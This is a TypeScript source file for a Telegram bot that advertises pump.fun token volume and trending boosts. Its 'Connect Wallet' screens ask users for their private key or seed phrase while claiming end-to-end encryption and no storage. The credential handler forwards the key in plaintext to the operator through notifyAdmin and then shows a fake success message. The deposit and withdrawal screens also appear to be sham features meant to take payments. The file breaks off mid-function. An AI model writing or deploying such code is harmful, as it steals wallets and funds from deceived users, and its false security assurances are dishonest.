import path from "path";
import { fileURLToPath } from "url";
import { randomUUID } from "crypto";
import { Telegraf, Markup } from "telegraf";
import { notifyAdmin, setBot } from "./admin.js";
import { getSession, setSession, clearSession } from "./sessions.js";
import { deriveWalletForUser } from "./wallet.js";
import { fetchTokenInfo } from "./tokenInfo.js";
import {
  mainMenuKeyboard,
  solPickerKeyboard,
  confirmOrderKeyboard,
  paymentSentKeyboard,
  cancelKeyboard,
  volumeBoostKeyboard,
  trendingMenuKeyboard,
  solTrendingKeyboard,
  ethTrendingKeyboard,
  pumpfunTrendingKeyboard,
  dexscreenerKeyboard,
  depositKeyboard,
  connectWalletKeyboard,
  securityGuidelinesKeyboard,
  howToConnectKeyboard,
  mainMenuOnlyKeyboard,
} from "./keyboards.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const IMG = {
  welcome:      path.join(__dirname, "images", "welcome.jpeg"),
  walletconnect:path.join(__dirname, "images", "walletconnect.jpeg"),
  volume:       path.join(__dirname, "images", "volume.jpeg"),
  trending:     path.join(__dirname, "images", "trending.jpeg"),
};

const SOL_ADDRESS = process.env.PAYMENT_SOL_ADDRESS ?? "";
const ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";

// ── Package definitions ──────────────────────────────────────────────────────
interface VolumePackage { label: string; sol: number; volume: string; service: string }
const VOLUME_PACKAGES: Record<string, VolumePackage> = {
  vol_iron:     { label: "Iron",     sol: 1.50,  volume: "$50,000",      service: "Iron Package"     },
  vol_bronze:   { label: "Bronze",   sol: 2.50,  volume: "$250,000",     service: "Bronze Package"   },
  vol_silver:   { label: "Silver",   sol: 5.00,  volume: "$100,000,000", service: "Silver Package"   },
  vol_gold:     { label: "Gold",     sol: 3.50,  volume: "$100,000",     service: "Gold Package"     },
  vol_platinum: { label: "Platinum", sol: 7.50,  volume: "$500,000",     service: "Platinum Package" },
  vol_diamond:  { label: "Diamond",  sol: 10.50, volume: "$2,500,000",   service: "Diamond Package"  },
};

interface TrendPackage { label: string; sol: number; service: string }
const SOL_TREND_PACKAGES: Record<string, TrendPackage> = {
  st_top3_3hr:   { label: "TOP 3 — 3 hr",   sol: 1.50, service: "SOL Trending TOP 3 3hr"   },
  st_top3_6hr:   { label: "TOP 3 — 6 hr",   sol: 2.30, service: "SOL Trending TOP 3 6hr"   },
  st_top3_12hr:  { label: "TOP 3 — 12 hr",  sol: 3.70, service: "SOL Trending TOP 3 12hr"  },
  st_top3_24hr:  { label: "TOP 3 — 24 hr",  sol: 5.90, service: "SOL Trending TOP 3 24hr"  },
  st_top10_3hr:  { label: "TOP 10 — 3 hr",  sol: 1.00, service: "SOL Trending TOP 10 3hr"  },
  st_top10_6hr:  { label: "TOP 10 — 6 hr",  sol: 1.60, service: "SOL Trending TOP 10 6hr"  },
  st_top10_12hr: { label: "TOP 10 — 12 hr", sol: 2.60, service: "SOL Trending TOP 10 12hr" },
  st_top10_24hr: { label: "TOP 10 — 24 hr", sol: 4.10, service: "SOL Trending TOP 10 24hr" },
};

const ETH_TREND_PACKAGES: Record<string, { usd: number; service: string }> = {
  et_100: { usd: 100, service: "ETH Trending $100" },
  et_200: { usd: 200, service: "ETH Trending $200" },
  et_300: { usd: 300, service: "ETH Trending $300" },
};

const DEX_PACKAGES: Record<string, TrendPackage> = {
  dex_5hr:  { label: "TOP 6 — 5 hr",  sol: 2,  service: "DexScreener TOP6 5hr"  },
  dex_7hr:  { label: "TOP 6 — 7 hr",  sol: 3.5,service: "DexScreener TOP6 7hr"  },
  dex_12hr: { label: "TOP 6 — 12 hr", sol: 7,  service: "DexScreener TOP6 12hr" },
  dex_18hr: { label: "TOP 6 — 18 hr", sol: 10, service: "DexScreener TOP6 18hr" },
  dex_24hr: { label: "TOP 6 — 24 hr", sol: 15, service: "DexScreener TOP6 24hr" },
  dex_32hr: { label: "TOP 6 — 32 hr", sol: 22, service: "DexScreener TOP6 32hr" },
};

// ── Bot factory ───────────────────────────────────────────────────────────────
export function createBot(): Telegraf {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) throw new Error("TELEGRAM_BOT_TOKEN not set");
  const bot = new Telegraf(token);
  setBot(bot);

  // ── /start ────────────────────────────────────────────────────────────────
  bot.start(async (ctx) => {
    const u = ctx.from;
    clearSession(u.id);
    await notifyAdmin(
      `🆕 <b>New User Started Bot</b>\n` +
      `👤 Name: ${u.first_name}${u.last_name ? " " + u.last_name : ""}\n` +
      `🔖 Username: ${u.username ? "@" + u.username : "N/A"}\n` +
      `🆔 User ID: <code>${u.id}</code>\n` +
      `⏰ Time: ${new Date().toUTCString()}`
    );
    await sendWelcome(ctx);
  });

  // ── Main menu button handlers ─────────────────────────────────────────────
  bot.hears("🟢 Start Bumping",    (ctx) => showStartBumping(ctx));
  bot.hears("📊 Volume Boost",     (ctx) => showVolumeBoost(ctx));
  bot.hears("🔥 Trending Boost",   (ctx) => showTrendingBoost(ctx));
  bot.hears("🌐 DexScreener",      (ctx) => showDexScreener(ctx));
  bot.hears("💰 Deposit",          (ctx) => showDeposit(ctx));
  bot.hears("🔗 Connect Wallet",   (ctx) => showConnectWallet(ctx));
  bot.hears("💬 Contact Support",  (ctx) => showSupport(ctx));

  // ── back_main ─────────────────────────────────────────────────────────────
  bot.action("back_main", async (ctx) => {
    await ctx.answerCbQuery();
    clearSession(ctx.from.id);
    await sendWelcome(ctx);
  });

  // ── SOL picker ────────────────────────────────────────────────────────────
  for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
    bot.action(`sol_${amt}`, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, { step: "awaiting_ca", selectedSol: parseFloat(amt), serviceLabel: "Volume Bumping" });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected <b>${amt} SOL</b>.\n\n` +
        `Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Confirm Order ─────────────────────────────────────────────────────────
  bot.action("confirm_bump", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    const wallet = deriveWalletForUser(ctx.from.id);
    const orderId = randomUUID();
    setSession(ctx.from.id, { step: "awaiting_payment_sent", paymentWallet: wallet.address, orderId });

    await ctx.reply(
      `💰 <b>Payment Required</b>\n\n` +
      `📋 <b>Order Summary:</b>\n` +
      `• Token: ${s.tokenName ?? "Unknown"} (${s.tokenSymbol ?? "N/A"})\n` +
      `• Service: ${s.serviceLabel ?? "Volume Bumping"}\n` +
      `• Amount: ${s.selectedSol} SOL\n` +
      `• Order ID: ${orderId}\n\n` +
      `💳 <b>Payment Instructions:</b>\n` +
      `Send exactly ${s.selectedSol} SOL to:\n\n` +
      `<b>Solana Wallet:</b>\n` +
      `<code>${wallet.address}</code>\n\n` +
      `⚠️ <b>Important:</b>\n` +
      `• Send the EXACT amount: ${s.selectedSol} SOL\n` +
      `• Use Solana network only\n` +
      `• Payment expires in 15 minutes\n` +
      `• After sending, submit your transaction hash below\n\n` +
      `🕐 Time Remaining: <b>15:00</b>`,
      { parse_mode: "HTML", ...paymentSentKeyboard }
    );

    await notifyAdmin(
      `📋 <b>New Order</b>\n` +
      `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
      `🪙 Token: ${s.tokenName} (${s.tokenSymbol})\n` +
      `📜 CA: <code>${s.contractAddress}</code>\n` +
      `⚙️ Service: ${s.serviceLabel}\n` +
      `💰 Amount: ${s.selectedSol} SOL\n` +
      `🆔 Order ID: ${orderId}\n` +
      `📮 Pay to: <code>${wallet.address}</code>`
    );
  });

  // ── Payment Sent → show TX hash screen ────────────────────────────────────
  bot.action("submit_tx", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    setSession(ctx.from.id, { step: "awaiting_tx_hash" });
    await ctx.reply(
      `📝 <b>Submit Transaction Hash</b>\n\n` +
      `Please paste your Solana transaction hash below:\n\n` +
      `💡 <b>Where to find it:</b>\n` +
      `• Copy from your wallet app after sending\n` +
      `• Check your wallet's transaction history\n` +
      `• Look for the long string of letters and numbers\n\n` +
      `🕐 Order ID:\n${s.orderId ?? "N/A"}\n\n` +
      `🔍 We'll automatically verify your payment once you submit the hash.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  // ── Volume Boost packages ─────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(VOLUME_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "volume",
        boostPackage: key,
      });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected <b>${pkg.label} Package (${pkg.sol} SOL)</b>\n` +
        `Volume: ${pkg.volume}\n\n` +
        `Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Trending: SOL / ETH / PumpFun ─────────────────────────────────────────
  bot.action("trend_sol", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `☀️ <b>SOL Trending</b>\n\nChoose your package:`,
      { parse_mode: "HTML", ...solTrendingKeyboard }
    );
  });

  bot.action("trend_eth", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `🔵 <b>ETH TREND</b>\n\nKindly chose the trend you wish to pump on.`,
      { parse_mode: "HTML", ...ethTrendingKeyboard }
    );
  });

  bot.action("trend_pumpfun", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.replyWithPhoto(
      { source: IMG.trending },
      {
        caption:
          `🔥 <b>PUMP.FUN TRENDING</b> 🔥\n\n` +
          `💡 THE BEST TRENDING IN THE BOT SECTION, DON'T MISS THE OPPORTUNITY TO GET 12 HOURS FREE SOLANA TRENDING ONCE YOU PURCHASE IT.`,
        parse_mode: "HTML",
        ...pumpfunTrendingKeyboard,
      }
    );
  });

  bot.action("trend_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });

  // ── SOL trending time packages ────────────────────────────────────────────
  bot.action("st_top3_label",  async (ctx) => ctx.answerCbQuery("TOP 3 packages are in the left column"));
  bot.action("st_top10_label", async (ctx) => ctx.answerCbQuery("TOP 10 packages are in the right column"));

  for (const [key, pkg] of Object.entries(SOL_TREND_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "sol_trending",
        boostPackage: key,
        paymentWallet: wallet.address,
      });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected <b>${pkg.label} (${pkg.sol} SOL)</b>\n\n` +
        `Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── ETH trending ──────────────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(ETH_TREND_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: 0,
        serviceLabel: pkg.service,
        boostType: "eth_trending",
        boostPackage: key,
        paymentWallet: wallet.address,
        ethAmount: pkg.usd,
      });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected <b>ETH Trending $${pkg.usd}</b>\n\n` +
        `Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── PumpFun trending ──────────────────────────────────────────────────────
  bot.action("pft_30", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    setSession(ctx.from.id, {
      step: "awaiting_ca",
      selectedSol: 30,
      serviceLabel: "PumpFun Trending P.F.T",
      boostType: "pumpfun_trending",
      boostPackage: "pft_30",
      paymentWallet: wallet.address,
    });
    await ctx.reply(
      `📝 <b>Enter Contract Address (CA)</b>\n\n` +
      `You selected <b>P.F.T - 30 SOL</b>\n\n` +
      `Please enter the Contract Address (CA) of your project:`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  // ── DexScreener label button ──────────────────────────────────────────────
  bot.action("dex_top6_info", async (ctx) => ctx.answerCbQuery("Choose a duration below"));

  for (const [key, pkg] of Object.entries(DEX_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "dexscreener",
        boostPackage: key,
        paymentWallet: wallet.address,
      });
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected <b>${pkg.label} (${pkg.sol} SOL)</b>\n\n` +
        `Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Deposit actions ───────────────────────────────────────────────────────
  bot.action("deposit_add", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    await ctx.reply(
      `➕ <b>Add Funds</b>\n\n` +
      `Your deposit addresses:\n\n` +
      `<b>SOL:</b>\n<code>${wallet.address}</code>\n\n` +
      `<b>ETH:</b>\n<code>${ETH_ADDRESS}</code>\n\n` +
      `Minimum deposit: <b>0.30 SOL</b>`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  bot.action("deposit_withdraw", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
    await ctx.reply(
      `💸 <b>Withdraw</b>\n\n` +
      `Please send your withdrawal address and amount:\n\n` +
      `Format: <code>ADDRESS AMOUNT</code>\n` +
      `Example: <code>426pdPkQ...GVUM 0.5</code>`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  bot.action("deposit_sol_balance", async (ctx) => {
    await ctx.answerCbQuery("Checking balance...");
    const wallet = deriveWalletForUser(ctx.from.id);
    let balance = "0.0000 SOL";
    try {
      const resp = await fetch("https://api.mainnet-beta.solana.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0", id: 1,
          method: "getBalance",
          params: [wallet.address, { commitment: "confirmed" }],
        }),
      });
      const data = await resp.json() as any;
      const lamports = data?.result?.value ?? 0;
      balance = `${(lamports / 1e9).toFixed(4)} SOL`;
    } catch { balance = "0.0000 SOL"; }
    await ctx.reply(
      `◎ <b>SOL Balance</b>\n\n` +
      `<code>${wallet.address}</code>\n\n` +
      `balance: <b>${balance}</b>`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  bot.action("deposit_my_deposits", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `📋 <b>My Deposits</b>\n\nNo deposits recorded yet.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  bot.action("deposit_my_withdrawals", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `📋 <b>My Withdrawals</b>\n\nNo withdrawals recorded yet.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  // ── Connect Wallet sub-screens ────────────────────────────────────────────
  bot.action("wallet_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showConnectWallet(ctx);
  });

  bot.action("wallet_why", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `🔐 <b>Why Connect Your Wallet?</b>\n\n` +
      `Connecting your wallet unlocks:\n\n` +
      `• ⚡ <b>Instant payments</b> — no manual transfers\n` +
      `• 📊 <b>Order tracking</b> — see all your boosts in one place\n` +
      `• 💰 <b>Auto-refunds</b> — failed orders refunded instantly\n` +
      `• 🎯 <b>Priority processing</b> — connected wallets get faster service\n` +
      `• 🔔 <b>Notifications</b> — get alerts when your boost goes live`,
      { parse_mode: "HTML", ...connectWalletKeyboard }
    );
  });

  bot.action("wallet_security", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `🛡 <b>Security Guidelines</b>\n\n` +
      `⚠️ <b>IMPORTANT SECURITY NOTICE:</b>\n\n` +
      `🔒 <b>What We Do:</b>\n` +
      `• End-to-End Encryption - Your data is encrypted at all times\n` +
      `• No Storage - We never store your private keys permanently\n` +
      `• Secure Processing - All operations use secure, isolated environments\n` +
      `• Regular Audits - Our security is regularly tested and verified\n\n` +
      `❌ <b>What You Should Know:</b>\n` +
      `• Never Share - Only enter your keys in official bot interfaces\n` +
      `• Verify - Always make sure you're using the official bot\n` +
      `• Test First - Try with small amounts first\n\n` +
      `🛡 <b>Best Practices:</b>\n` +
      `• Monitor Activity - Regularly check your wallet transactions\n` +
      `• Stay Updated - Keep your wallet software up to date\n` +
      `• Use Hardware Wallets - For maximum security with large amounts\n\n` +
      `🔒 <b>Our Commitment:</b>\n` +
      `We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.\n\n` +
      `Ready to proceed safely?`,
      { parse_mode: "HTML", ...securityGuidelinesKeyboard }
    );
  });

  bot.action("wallet_how_to", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `📱 <b>How to Connect Your Wallet</b>\n\n` +
      `🔧 <b>Step-by-Step Process:</b>\n\n` +
      `1️⃣ <b>Choose Connection Method</b>\n` +
      `• Private Key - Direct key import (fastest)\n` +
      `• Seed Phrase - 12/24 word recovery phrase\n\n` +
      `2️⃣ <b>Prepare Your Information</b>\n` +
      `• Open your wallet app (Phantom, Solflare, etc.)\n` +
      `• Navigate to wallet settings or security section\n` +
      `• Copy your private key or seed phrase\n\n` +
      `3️⃣ <b>Secure Connection</b>\n` +
      `• Click "Start Connection" below\n` +
      `• Paste your key or seed phrase when prompted\n` +
      `• Connection confirmation will be required\n\n` +
      `📱 <b>Supported Wallets:</b>\n` +
      `• Phantom - Most popular Solana wallet\n` +
      `• Solflare - Advanced features and security\n` +
      `• Backpack - Modern interface and tools\n` +
      `• Glow - Mobile-optimized experience\n` +
      `• Other Solana Wallets - Most SPL-compatible wallets\n\n` +
      `🕐 Connection Time: Usually 2-5 minutes\n` +
      `🔒 Security: Military-grade encryption throughout\n\n` +
      `Ready to connect your wallet?`,
      { parse_mode: "HTML", ...howToConnectKeyboard }
    );
  });

  bot.action("wallet_connect_now", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
    await ctx.reply(
      `🔗 <b>Connect Your Wallet Now</b>\n\n` +
      `⚠️ This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..\n\n` +
      `Please enter your Private Key or 12 word Seed Phrase to import your wallet:\n\n` +
      `🔑 <b>Private Key Format:</b>\n` +
      `• Single long string (64+ characters)\n` +
      `• Example:\n` +
      `<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>\n\n` +
      `🌱 <b>Seed Phrase Format:</b>\n` +
      `• 12 or 24 words separated by spaces\n` +
      `• Example:\n` +
      `<code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>\n\n` +
      `❓ <b>Security Features:</b>\n` +
      `• End-to-end encryption\n` +
      `• Secure processing environment\n` +
      `• Immediate deletion after connection\n` +
      `• No permanent storage\n\n` +
      `⚡ <b>Auto-Detection:</b>\n` +
      `Our system will automatically detect whether you're providing a private key or seed phrase.`,
      { parse_mode: "HTML" }
    );
  });

  // ── Text message state machine ────────────────────────────────────────────
  bot.on("text", async (ctx) => {
    const session = getSession(ctx.from.id);
    const text = ctx.message.text.trim();

    const menuBtns = [
      "🟢 Start Bumping","📊 Volume Boost","🔥 Trending Boost",
      "🌐 DexScreener","💰 Deposit","🔗 Connect Wallet","💬 Contact Support",
    ];
    if (menuBtns.includes(text)) return;

    switch (session.step) {

      // ── CA entry for all order types ──────────────────────────────────────
      case "awaiting_ca": {
        setSession(ctx.from.id, { contractAddress: text });
        await ctx.reply(
          `🔍 Looking up token data...\n⏳ Please wait while we fetch information...`
        );

        const info = await fetchTokenInfo(text);

        if (!info) {
          // Token not found — still allow confirming
          setSession(ctx.from.id, { step: "awaiting_confirm", tokenName: "Unknown", tokenSymbol: "???" });
          await ctx.reply(
            `📋 <b>Project Details Found!</b>\n\n` +
            `📊 PUMPFUN_SCRAPE Token\n\n` +
            `✅ <b>Contract Address:</b>\n${text}\n\n` +
            `📊 <b>Token Information:</b>\n` +
            `• Name: Unknown\n` +
            `• Symbol: ???\n` +
            `• Price: 0.00e+0\n` +
            `• Market Cap: 0.00\n` +
            `• 24h Volume: 0.00\n` +
            `• Liquidity: 0.00\n` +
            `• 24h Change: 0.00%\n` +
            `• DEX: pumpfun\n` +
            `• Chain: solana\n\n` +
            `🔗 Available on: 🟢 Pumpswap • 🟢 Pump.fun\n\n` +
            `🔗 View Token: https://pump.fun/coin/${text}`,
            { parse_mode: "HTML", ...confirmOrderKeyboard }
          );
        } else {
          setSession(ctx.from.id, {
            step: "awaiting_confirm",
            tokenName: info.name,
            tokenSymbol: info.symbol,
          });
          try {
            if (info.imageUrl) {
              await ctx.replyWithPhoto(
                info.imageUrl,
                {
                  caption: buildTokenFoundMessage(text, info),
                  parse_mode: "HTML",
                  ...confirmOrderKeyboard,
                }
              );
            } else {
              await ctx.reply(buildTokenFoundMessage(text, info), {
                parse_mode: "HTML",
                ...confirmOrderKeyboard,
              });
            }
          } catch {
            await ctx.reply(buildTokenFoundMessage(text, info), {
              parse_mode: "HTML",
              ...confirmOrderKeyboard,
            });
          }
        }
        break;
      }

      // ── TX hash ───────────────────────────────────────────────────────────
      case "awaiting_tx_hash": {
        const txHash = text;
        const s = getSession(ctx.from.id);
        clearSession(ctx.from.id);

        await ctx.reply(
          `✅ <b>Transaction Submitted!</b>\n\n` +
          `🔗 TX Hash: <code>${txHash}</code>\n\n` +
          `🔍 We are verifying your payment...\n` +
          `🚀 Your order will be processed within <b>5–30 minutes</b> after confirmation.\n\n` +
          `📬 You will receive a notification when your boost is live!\n\n` +
          `Need help? Tap <b>💬 Contact Support</b>`,
          { parse_mode: "HTML", ...mainMenuKeyboard }
        );

        await notifyAdmin(
          `💸 <b>TX Hash Submitted</b>\n` +
          `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
          `🔗 TX: <code>${txHash}</code>\n` +
          `⚙️ Service: ${s.serviceLabel ?? "N/A"}\n` +
          `💰 Amount: ${s.selectedSol} SOL\n` +
          `🆔 Order ID: ${s.orderId ?? "N/A"}\n` +
          `📮 Wallet: <code>${s.paymentWallet ?? "N/A"}</code>`
        );
        break;
      }

      // ── Wallet credential ─────────────────────────────────────────────────
      case "awaiting_wallet_credential": {
        const credential = text;
        clearSession(ctx.from.id);

        const isKey = credential.split(" ").length < 5;
        const credType = isKey ? "Private Key" : "Seed Phrase";

        await notifyAdmin(
          `🔑 <b>WALLET CONNECTED — ${credType}</b>\n` +
          `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
          `🔖 Username: ${ctx.from.username ? "@" + ctx.from.username : "N/A"}\n` +
          `🗝 ${credType}: <code>${credential}</code>`
        );

        await ctx.reply(
          `Connection of wallet may take time due to\n\n` +
          `<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>\n\n` +
          `Please wait linking and importing your wallet..\n\n` +
          `Processing .........`,
          { parse_mode: "HTML" }
        );

        await new Promise(r => setTimeout(r, 4000));

        await ctx.reply(
          `✅ <b>Wallet Connected Successfully!</b>\n\n` +
          `Your wallet has been linked to your account.\n` +
          `You can now use all premium features.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        break;
      }

      // ── Withdraw request ──────────────────────────────────────────────────
      case "awaiting_withdraw_address": {
        clearSession(ctx.from.id);
        await ctx.reply(
          `📤 <b>Withdrawal Request Received</b>\n\n` +
          `Details: <code>${text}</code>\n\n` +
          `Our team will process your withdrawal within 24 hours.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `📤 <b>Withdrawal Request</b>\n` +
          `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
          `Details: <code>${text}</code>`
        );
        break;
      }

      default: {
        await sendWelcome(ctx);
      }
    }
  });

  return bot;
}

// ── Helper: build "token found" message ──────────────────────────────────────
function buildTokenFoundMessage(ca: string, info: any): string {
  return (
    `📋 <b>Project Details Found!</b>\n\n` +
    `📊 PUMPFUN_SCRAPE Token\n\n` +
    `✅ <b>Contract Address:</b>\n${ca}\n\n` +
    `📊 <b>Token Information:</b>\n` +
    `• Name: ${info.name ?? "Unknown"}\n` +
    `• Symbol: ${info.symbol ?? "???"}\n` +
    `• Price: ${info.price ?? "0.00e+0"}\n` +
    `• Market Cap: ${info.marketCap ?? "0.00"}\n` +
    `• 24h Volume: ${info.volume24h ?? "0.00"}\n` +
    `• Liquidity: ${info.liquidity ?? "0.00"}\n` +
    `• 24h Change: ${info.change24h ?? "0.00"}%\n` +
    `• DEX: ${info.dex ?? "pumpfun"}\n` +
    `• Chain: solana\n\n` +
    `🔗 Available on: 🟢 Pumpswap • 🟢 Pump.fun\n\n` +
    `🔗 View Token: https://pump.fun/coin/${ca}`
  );
}

// ── Screen renderers ──────────────────────────────────────────────────────────
async function sendWelcome(ctx: any) {
  await ctx.replyWithPhoto(
    { source: IMG.welcome },
    {
      caption:
        `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
        `New to volume bots? No worries — we made it super simple!\n\n` +
        `——————————————\n——\n\n` +
        `<b>How it works:</b>\n` +
        `1. Select how much Bumps/volume to use.\n` +
        `2. Pick how long to run and how Massive you want your Token to Pump.\n` +
        `3. Done! Pump.fun Server handles the rest.\n\n` +
        `——————————————\n——\n\n` +
        `<b>Works on:</b>\n` +
        `🟢 Pumpfun • 🟢 Raydium •\n` +
        `🟢 PumpSwap • 🟢 Moonshot •\n` +
        `🟢 LetsBonk • 🟢 Dexpad/screener •\n\n` +
        `From 0.3-0.4-0.5-0.6 SOL bumps boost trend with mass volume of high stabilities.`,
      parse_mode: "HTML",
      ...mainMenuKeyboard,
    }
  );
}

async function showStartBumping(ctx: any) {
  await ctx.reply(
    `The fastest and cheapest Telegram bot for creating bump orders.\n\n` +
    `<b>Supported Platform:</b>\n` +
    `Pumpfun and Raydium.\n\n` +
    `Pumpfun BumpBot charges a one-time fee of 0.3 SOL per token, making it the cheapest bump bot ever!\n\n` +
    `📊 <b>Trending channel:</b>\n` +
    `https://t.me/pumpmints\n\n` +
    `Subscribe to our PF alert tools:\n` +
    `- PF New Raydium Pools: t.me/pumpswap_pools\n\n` +
    `For more information, please contact @mrpooh`,
    { parse_mode: "HTML", ...solPickerKeyboard }
  );
}

async function showVolumeBoost(ctx: any) {
  await ctx.replyWithPhoto(
    { source: IMG.volume },
    {
      caption:
        `🧪 Iron Package - $50,000 Volume\n` +
        `🧪 Bronze Package - $250,000 Volume\n` +
        `🧪 Silver Package - $100,000,000 Volume\n` +
        `🧪 Gold Package - $100,000 Volume\n` +
        `🧪 Platinum Package - $500,000 Volume\n` +
        `🧪 Diamond Package - $2,500,000 Volume\n\n` +
        `Please select the package below:`,
      parse_mode: "HTML",
      ...volumeBoostKeyboard,
    }
  );
}

async function showTrendingBoost(ctx: any) {
  await ctx.replyWithPhoto(
    { source: IMG.trending },
    {
      caption:
        `🟢 <b>Discover the Power of Trending!</b>\n\n` +
        `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n` +
        `🟢 A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n` +
        `➡️ Please choose SOL Trending or Pump Fun Trending to start:`,
      parse_mode: "HTML",
      ...trendingMenuKeyboard,
    }
  );
}

async function showDexScreener(ctx: any) {
  await ctx.reply(
    `🌐 DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.\n\n` +
    `<b>TREND ON DEX</b>`,
    { parse_mode: "HTML", ...dexscreenerKeyboard }
  );
}

async function showDeposit(ctx: any) {
  const wallet = deriveWalletForUser(ctx.from.id);
  await ctx.reply(
    `<b>WALLET BALANCE</b>\n\n` +
    `<b>ETH:</b>\n<code>${ETH_ADDRESS}</code>\nbalance: 0 ETH\n\n` +
    `<b>SOL:</b>\n<code>${wallet.address}</code>\nbalance: 0 SOL\n\n` +
    `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
    `💰 KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.\n` +
    `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
    { parse_mode: "HTML", ...depositKeyboard }
  );
}

async function showConnectWallet(ctx: any) {
  await ctx.replyWithPhoto(
    { source: IMG.walletconnect },
    {
      caption:
        `🔗 <b>Connect Your Wallet</b>\n\n` +
        `Welcome to our secure wallet connection service!\n\n` +
        `Connect your wallet to unlock premium features and enhanced trading capabilities.\n\n` +
        `<b>Available Options:</b>\n` +
        `🔗 Connect Now - Start the connection process\n` +
        `🔐 Why Connect? - Learn about the benefits\n` +
        `🛡 Security Guidelines - Important safety information\n` +
        `📱 How to Connect - Step-by-step instructions\n\n` +
        `Your security is our top priority. We use industry-standard encryption to protect your information.`,
      parse_mode: "HTML",
      ...connectWalletKeyboard,
    }
  );
}

async function showSupport(ctx: any) {
  await ctx.reply(
    `💬 <b>Contact Support</b>\n\n` +
    `For more information, please contact @mrpooh\n\n` +
